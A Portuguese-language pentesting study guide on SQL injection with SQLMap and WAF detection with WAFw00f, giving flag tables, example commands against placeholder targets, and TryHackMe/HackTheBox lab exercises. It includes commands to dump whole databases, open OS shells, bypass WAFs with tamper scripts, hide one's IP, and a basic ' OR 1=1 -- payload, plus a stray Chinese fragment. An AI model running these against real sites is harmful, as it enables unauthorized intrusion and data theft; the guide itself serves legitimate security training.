# 💉 Injeção e Fuzzing

> Detecção e exploração de SQL Injection e bypass de WAF.

---

## SQLMap

Detecção e exploração automática de SQL Injection. Uma das ferramentas mais poderosas para web security.

### Instalação
```bash
sudo apt install -y sqlmap
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-u` | URL com parâmetros |
| `--data` | Dados POST |
| `--batch` | Modo automático (sem perguntas) |
| `--level` | Nível de testes (1-5, padrão 1) |
| `--risk` | Risco dos testes (1-3, padrão 1) |
| `--dbs` | Listar bancos de dados |
| `--tables` | Listar tabelas |
| `--columns` | Listar colunas |
| `--dump` | Baixar dados |
| `--os-shell` | Shell do SO |
| `--sql-shell` | Shell SQL |
| `--cookie` | Cookie de sessão |
| `--random-agent` | User agent aleatório |
| `--delay` | Delay entre requests |
| `-p` | Parâmetro específico |
| `--tamper` | Script de bypass (WAF) |
| `--technique` | Técnicas específicas |

### Exemplos práticos

```bash
# Scan básico de URL
sqlmap -u "http://target.com/page?id=1" --batch

# Scan mais agressivo
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Com cookie de sessão
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

# Listar bancos de dados
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Listar tabelas de um banco
sqlmap -u "http://target.com/page?id=1" -D mydb --tables --batch

# Listar colunas de uma tabela
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --columns --batch

# Dump de dados
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump --batch

# Dump de todos os bancos
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Shell interativo do SO
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Shell SQL
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch

# Parâmetro específico
sqlmap -u "http://target.com/page?id=1&name=test" -p id --batch

# User agent aleatório
sqlmap -u "http://target.com/page?id=1" --random-agent --batch

# Com delay (evitar bloqueio)
sqlmap -u "http://target.com/page?id=1" --delay=1 --batch

# Bypass WAF com tamper
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch

# Techniques específicas
sqlmap -u "http://target.com/page?id=1" --technique=BEU --batch
# B = Boolean-based blind
# E = Error-based
# U = UNION query
# S = Stacked queries
# T = Time-based blind
```

### Técnicas de SQL Injection

| Tipo | Como o SQLMap detecta |
|:---|:---|
| **Error-based** | Erros de SQL visíveis na resposta |
| **Boolean-based blind** | Resposta muda dependendo de TRUE/FALSE |
| **Time-based blind** | Delay na resposta indica injeção |
| **UNION query** | Combina resultados de queries |
| **Stacked queries** | Executa múltiplos statements |

### Bypass de WAF
```bash
# Space to comment
sqlmap -u "URL" --tamper=space2comment

# Entre bins
sqlmap -u "URL" --tamper=between

# Múltiplos tamper
sqlmap -u "URL" --tamper=space2comment,between,randomcase
```

---

## WAFw00f

Detecta se o site usa WAF (Web Application Firewall) e qual modelo.

### Instalação
```bash
sudo pip3 install wafw00f
```

### Flags principais

| Flag | O que faz |
|:---|:---|
| `-a` | Todos os testes |
| `-l` | Listar WAFs suportados |
| `-p` | Proxy |
| `-o` | Output |
| `-f` | Output format (json, txt) |
| `-v` | Verbose |

### Exemplos práticos

```bash
# Detectar WAF
wafw00f example.com

# Todos os testes
wafw00f -a example.com

# Listar WAFs suportados
wafw00f -l

# Com proxy
wafw00f -p http://127.0.0.1:8080 example.com

# Output JSON
wafw00f -o output.json -f json example.com

# Verbose
wafw00f -v example.com
```

### Por que isso importa
Se o site tem WAF, você precisa adaptar seus ataques:
- Usar tamper no SQLMap
- Usar rate limiting mais baixo
- Usar proxychains para esconder IP
- Bypass de WAF com payloads específicos

---

## Lab Prático

### Exercício 1: SQL Injection com SQLMap
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/sqlinjectionlm
- **O que vai praticar:** Detecção automática de SQLi, extração de dados, bypass de WAF e exploração de bancos
- **Tempo estimado:** 60 minutos

### Exercício 2: DVWA - SQL Injection
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/dvwa
- **O que vai praticar:** SQL Injection manual e automatizada, union-based, blind SQLi e uso do SQLMap
- **Tempo estimado:** 45 minutos

### Exercício 3: WAF Bypass
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/wafbypass
- **O que vai praticar:** Técnicas de bypass de WAF, tamper scripts e evasão de firewalls aplicativos
- **Tempo estimado:** 40 minutos

### Exercício 4: Injection Foundations
- **Plataforma:** HackTheBox
- **Link:** https://app.hackthebox.com/starting-point
- **O que vai praticar:** SQL Injection básica, identificação de vulnerabilidades e extração de dados sensiveis
- **Tempo estimado:** 90 minutos

### Dica de Estudo
> Comece sempre pelo SQLMap em modo `--batch` para detecção rápida. Depois, prague manualmente com payloads básicos (`' OR 1=1 --`). Documente cada técnica encontrada e对应的 WAF (se houver). Use tamper scripts para bypass quando necessário.
